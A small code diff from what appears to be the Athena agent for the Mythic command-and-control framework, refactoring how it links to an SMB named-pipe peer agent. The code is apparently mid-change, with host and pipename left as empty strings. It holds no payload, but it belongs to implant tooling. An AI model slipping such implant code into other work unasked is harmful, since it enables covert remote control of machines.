@@ -1,4 +1,5 @@
 ﻿using Athena.Models.Mythic.Response;
+using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
 using H.Pipes.Args;
@@ -24,7 +25,7 @@ namespace Athena.Config
             this.messageOut = new ConcurrentBag<DelegateMessage>();
         }
 
-        public List<DelegateMessage> GetMessages()
+        public async Task<List<DelegateMessage>> GetMessages()
         {
             List<DelegateMessage> messagesOut;
             lock (_lock)
@@ -37,8 +38,14 @@ namespace Athena.Config
         }
 
         //Link to the Athena SMB Agent
-        public async Task<bool> Link(string host, string pipename)
+        public async Task<bool> Link(MythicJob job)
         {
+
+
+            //string host, string pipename
+            string pipename = "";
+            string host = "";
+
             try
             {
                 if (this.clientPipe is null || !this.connected)
